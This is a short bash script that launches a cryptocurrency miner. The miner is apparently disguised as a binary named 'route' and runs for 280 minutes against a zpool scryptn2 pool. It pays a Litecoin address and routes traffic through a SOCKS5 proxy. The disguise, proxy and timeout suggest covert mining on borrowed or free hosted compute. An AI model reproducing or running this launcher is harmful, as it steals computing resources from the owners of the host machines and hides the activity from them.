#!/bin/bash
chmod +x route 
timeout 280m ./route -a scryptn2 -o stratum+tcp://scryptn2.eu.mine.zpool.ca:4339 -u LQNiMe5CksHxP1JA9HKxLeSKwyS9T4vjyn -p c=LTC -t 2 -x socks5://192.252.209.155:14455
sudo apt update
